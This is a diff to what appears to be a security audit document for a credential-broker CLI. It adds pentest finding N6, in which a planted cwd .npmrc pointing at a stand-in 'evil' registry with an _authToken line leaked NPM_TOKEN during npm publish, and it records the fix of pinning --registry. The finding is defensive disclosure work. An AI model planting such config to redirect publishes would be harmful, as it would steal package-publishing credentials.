@@ -164,6 +164,21 @@ Robustness checks passed with no findings: `init` refuses to clobber an existing
 vault, on-disk KDF parameters are production-grade (so offline attacks on the
 encrypted files are bounded by the master password), and fuzzing found no crashes.
 
+### Found in the pentest (cycle 6: connector config redirection)
+
+- **N6 — `npm publish` did not pin the registry, leaking the token.** `npm`
+  resolves config as `CLI flag > env > project .npmrc (cwd) > user .npmrc`, and
+  `publish` runs in the caller-controlled `cwd`. A planted `cwd/.npmrc` with
+  `registry=http://evil/` and `//evil/:_authToken=${NPM_TOKEN}` redirected the
+  publish to an attacker registry and sent the broker-injected `NPM_TOKEN`
+  (the real credential) there. `publish` and `deprecate` now pin `--registry`
+  to `https://registry.npmjs.org/` on the CLI, which overrides the cwd
+  `.npmrc`. Behaviour note: publishing to a non-npmjs.org registry via the
+  broker is disabled until an owner-configured trusted registry lands
+  (`ISSUE-KVD-CLI-CF1724`). The same class was checked and found NOT
+  exploitable for `twine` (reads `~/.pypirc`, not the cwd) and the `aws` CLI
+  (no cwd config).
+
 ## Design-level items — documented, not code-patched
 
 These are threat-model boundaries, not one-line bugs. They are stated honestly
